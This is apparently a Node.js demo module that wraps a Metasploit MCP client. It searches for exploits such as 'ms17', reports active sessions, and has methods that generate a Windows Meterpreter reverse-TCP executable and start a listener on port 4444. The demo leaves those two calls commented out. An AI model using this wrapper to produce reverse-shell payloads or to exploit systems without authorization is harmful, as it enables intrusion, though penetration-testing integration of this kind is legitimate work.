// Demo Application - Using Metasploit MCP Client
// This shows how to integrate the MCP client in your Node.js app

import { MetasploitMCPClient } from './working_mcp_client.mjs';

// Create a simple security scanner application
class SecurityScanner {
    constructor() {
        this.mcpClient = new MetasploitMCPClient();
    }

    async initialize() {
        console.log('Initializing Security Scanner...');
        await this.mcpClient.connect();
        console.log('Ready!\n');
    }

    async cleanup() {
        await this.mcpClient.disconnect();
    }

    async scanForVulnerabilities(targetType = 'smb') {
        console.log(`\n🔍 Scanning for ${targetType.toUpperCase()} vulnerabilities...`);
        
        try {
            const exploits = await this.mcpClient.listExploits(targetType);
            console.log(`Found ${exploits.length} potential exploits`);
            
            // Show first 10 exploits
            console.log('\nTop exploits:');
            exploits.slice(0, 10).forEach((exploit, index) => {
                console.log(`  ${index + 1}. ${exploit}`);
            });
            
            return exploits;
        } catch (error) {
            console.error('Scan failed:', error.message);
            return [];
        }
    }

    async generateTestPayload() {
        console.log('\n🔧 Generating test payload...');
        
        try {
            const result = await this.mcpClient.generatePayload(
                'windows/meterpreter/reverse_tcp',
                'exe',
                {
                    LHOST: '10.0.0.1',
                    LPORT: 4444
                }
            );
            
            if (result.status === 'success') {
                console.log('✓ Payload generated successfully!');
                console.log(`  Size: ${result.payload_size} bytes`);
                console.log(`  Saved to: ${result.server_save_path}`);
            } else {
                console.log('✗ Failed to generate payload:', result.message);
            }
            
            return result;
        } catch (error) {
            console.error('Payload generation failed:', error.message);
            return null;
        }
    }

    async setupListener(port = 4444) {
        console.log(`\n📡 Setting up listener on port ${port}...`);
        
        try {
            const result = await this.mcpClient.startListener(
                'windows/meterpreter/reverse_tcp',
                '0.0.0.0',
                port
            );
            
            if (result.status === 'success') {
                console.log('✓ Listener started successfully!');
                console.log(`  Job ID: ${result.job_id}`);
                console.log(`  Listening on: 0.0.0.0:${port}`);
            } else {
                console.log('✗ Failed to start listener:', result.message);
            }
            
            return result;
        } catch (error) {
            console.error('Listener setup failed:', error.message);
            return null;
        }
    }

    async checkStatus() {
        console.log('\n📊 Checking system status...');
        
        try {
            // Check sessions
            const sessions = await this.mcpClient.listActiveSessions();
            console.log(`\nActive Sessions: ${sessions.count || 0}`);
            
            // Check listeners
            const listeners = await this.mcpClient.listListeners();
            console.log(`Active Handlers: ${listeners.handler_count || 0}`);
            console.log(`Other Jobs: ${listeners.other_job_count || 0}`);
            
            return { sessions, listeners };
        } catch (error) {
            console.error('Status check failed:', error.message);
            return null;
        }
    }
}

// Main demo function
async function runDemo() {
    const scanner = new SecurityScanner();
    
    try {
        // Initialize connection
        await scanner.initialize();
        
        // Run various operations
        console.log('=== Security Scanner Demo ===');
        
        // 1. Scan for vulnerabilities
        await scanner.scanForVulnerabilities('ms17');
        await scanner.scanForVulnerabilities('ssh');
        
        // 2. Check current status
        await scanner.checkStatus();
        
        // 3. Generate a test payload (commented out for safety)
        // await scanner.generateTestPayload();
        
        // 4. Setup a listener (commented out for safety)
        // await scanner.setupListener(4444);
        
        console.log('\n✅ Demo completed successfully!');
        
    } catch (error) {
        console.error('Demo failed:', error);
    } finally {
        // Always cleanup
        await scanner.cleanup();
    }
}

// Interactive menu example
async function interactiveMenu() {
    const scanner = new SecurityScanner();
    
    try {
        await scanner.initialize();
        
        console.log('\n=== Metasploit Security Tools ===');
        console.log('1. Scan for vulnerabilities');
        console.log('2. Generate payload');
        console.log('3. Start listener');
        console.log('4. Check status');
        console.log('5. Exit');
        
        // In a real app, you would handle user input here
        // For demo, just show the menu
        
    } finally {
        await scanner.cleanup();
    }
}

// Export for use in other modules
export { SecurityScanner };

// Run demo if executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
    console.log('Starting Metasploit MCP Demo Application...\n');
    runDemo().catch(console.error);
} 